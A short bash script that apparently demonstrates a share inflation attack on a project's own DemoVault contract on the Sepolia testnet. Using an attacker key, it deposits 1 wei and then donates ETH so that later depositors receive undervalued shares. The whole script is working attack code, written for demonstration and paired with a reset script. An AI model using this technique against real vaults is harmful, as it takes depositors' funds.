#!/usr/bin/env bash
# The inflation attack on DemoVault (contracts/src/DemoVault.sol), played by a stranger's key
# (.dabao-keys/attacker.key): on the empty vault, deposit 1 wei (1 share), then donate 0.00006 ETH.
# A 0.0001 ETH deposit then mints 1 share, worth 0.00008 ETH. demo/vault/reset.sh undoes it.
set -euo pipefail
cd "$(dirname "$0")/../.."
VAULT=0x18375B9E9cDA8Cd25ecbCB69AE94c74f7d02F163
RPC=${RPC_URL:-https://ethereum-sepolia-rpc.publicnode.com}
KEY="$(tr -d ' \n' < .dabao-keys/attacker.key)"
ME=$(cast wallet address --private-key "$KEY")
[ "$(cast call $VAULT 'totalSupply()(uint256)' --rpc-url $RPC)" = 0 ] || { echo "the vault isn't empty: run demo/vault/reset.sh first (or the Safe holds shares)"; exit 1; }
tx() { cast send "$@" --private-key "$KEY" --rpc-url "$RPC" --json | python3 -c 'import json,sys; r=json.load(sys.stdin); print("  tx", r["transactionHash"], "status", r["status"])'; }
echo "attacker $ME: deposit 1 wei"
tx $VAULT "deposit(address)" $ME --value 1
echo "attacker: donate 0.00006 ETH straight to the vault"
tx $VAULT --value 60000000000000
echo "vault: $(cast call $VAULT 'totalAssets()(uint256)' --rpc-url $RPC) wei for $(cast call $VAULT 'totalSupply()(uint256)' --rpc-url $RPC) share(s)"
